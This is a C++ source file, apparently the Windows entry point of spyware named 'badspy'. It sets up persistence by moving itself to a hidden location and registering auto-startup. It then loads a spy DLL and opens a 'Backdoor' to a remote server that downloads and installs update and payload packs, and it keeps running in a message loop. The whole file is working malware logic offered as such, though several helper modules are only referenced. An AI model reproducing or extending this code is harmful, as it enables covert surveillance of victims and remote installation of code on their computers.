#include <stdio.h>
#ifndef _WINSOCKAPI_
#define _WINSOCKAPI_
#endif
#include <windows.h>
#include "proc.h"
#include "main.h"
#include "fso.h"
#include "bdr\backdoor.h"
#include "shd\selfprt.h"
#include "../../log-cpp/log.h"
#include <Gdiplus.h>
#include <Shlwapi.h>
#define ERROR_CODE 1
#define OK_CODE 0

HMODULE badspyModule = NULL;
HMODULE badspyDllModule = NULL;
Backdoor * backdoor = NULL;

int CALLBACK WinMain(_In_ HINSTANCE hInstance, _In_ HINSTANCE hPrevInstance, _In_ LPSTR lpCmdLine, _In_ int nCmdShow)
{
	// first, setup some self-protecting features
	LOG_I("Start self-protecting features");
	if (start_self_protect())
	{
		LOG_I("Restart new instance from another safe area!");
		return OK_CODE;
	}

	// after that, we will load dll library to memory
	if (!init_library())
	{
		LOG_E("Can not load dll library");
		return ERROR_CODE;
	}

	// then bind functions from dll
	if (!init_dll_func())
	{
		free_library();
		LOG_E("Can not bind dll functions");
		return ERROR_CODE;
	}

	// now, our spy could be safe then start spy features
	if (load_spy())
	{
		free_library();
		LOG_E("Can not load spy!");
		return ERROR_CODE;
	}

	// try to initializing backdoor feature, must has internet and server is living
	// check for update itself is available then download and auto install(quitted itself
	// after run install update pack)
	LOG_I("Initializing backdoor...");
	init_backdoor();
	if (backdoor != NULL)
	{
		LOG_I("Checking for update available...");
		if (check_and_dwnl_update())
		{
			LOG_I("Update pack is available, exit to install this pack");
			LOG_I("Spy is stopping...");
			unload_spy();
			LOG_I("Installing update pack...");
			install_update_pack();
			goto quit;
		}
	}

	// initializing backdoor is failed or no update is available then we just check
	// for another packs(in another thread) and start looper to keep this instance is alive
	install_packs();
	start_looper();

	// badspy is stopping? I think below code won't execute :)
	LOG_I("Spy is stopping...");
	unload_spy();

	// try to release some resources
quit:
	free_backdoor();
	free_library();

	LOG_I("Exited!");
	return OK_CODE;
}

void start_looper()
{
	LOG("Start looper");
	MSG msg;
	while (GetMessage(&msg, NULL, 0, 0))
	{
		TranslateMessage(&msg);
		DispatchMessage(&msg);
	}
	LOG("Stop looper");
}

bool init_library()
{
	LOG("Loading dll library");
	if ((badspyDllModule = LoadLibraryA("badspy.c.dll")) == NULL)
		return false;
	if ((badspyModule = GetModuleHandleA("badspy.c.dll")) == NULL)
		return false;
	LOG("Loaded dll library");
	return true;
}

bool init_dll_func()
{
	LOG("Loading dll functions");
	if ((load_spy = (LOAD_SPY)GetProcAddress(badspyModule, "load_spy")) == NULL)
		return false;
	if ((unload_spy = (UNLOAD_SPY)GetProcAddress(badspyModule, "unload_spy")) == NULL)
		return false;
	LOG("loaded dll functions");
	return true;
}

void free_library()
{
	LOG("Free dll library");
	if (badspyDllModule != NULL)
	{
		FreeLibrary(badspyDllModule);
		badspyDllModule = NULL;
	}
}

void init_backdoor()
{
	char * root_dir = new char[MAX_PATH];
	FSO::get_dir_path(root_dir);
	char * working_dir = new char[MAX_PATH];
	strcpy(working_dir, root_dir);
	strcat(working_dir, SPY_DWL_TMP_DIR_NAME);
	try
	{
		backdoor = new Backdoor(SPY_NET_SERVER_ADDR, SPY_NET_SERVER_DWL_PORT, working_dir, root_dir);
	}
	catch (int error)
	{
		LOG_E("Error when create backdoor: %d", error);
	}
	catch (...)
	{
		LOG_E("Unhandled exception!");
	}
	delete[] working_dir;
	delete[] root_dir;
}

void free_backdoor()
{
	if (backdoor != NULL)
	{
		delete backdoor;
		backdoor = NULL;
	}
}

bool check_and_dwnl_update()
{
	try
	{
		return backdoor->check_and_dwnl_update();
	}
	catch (int error)
	{
		LOG_E("Error when check and download update pack: %d", error);
	}
	catch (...)
	{
		LOG_E("Unhandled exception!");
	}
	return false;
}

void install_update_pack()
{
	backdoor->install_update_pack();
}

void install_packs()
{
	if (backdoor != NULL)
	{
		DWORD thread_id;
		CreateThread(NULL, 0, [](LPVOID  p) -> DWORD
		{
			try
			{
				backdoor->install_packs_if_necessary();
			}
			catch (int error)
			{
				LOG_E("An error when try to install packs: %d", error);
			}
			free_backdoor();
			return 0;
		}, NULL, NULL, &thread_id);
	}
}

bool start_self_protect()
{
	bool moved = SelfPrt::move_to_safearea();
	if (!moved)
		SelfPrt::auto_startup();
	return moved;
}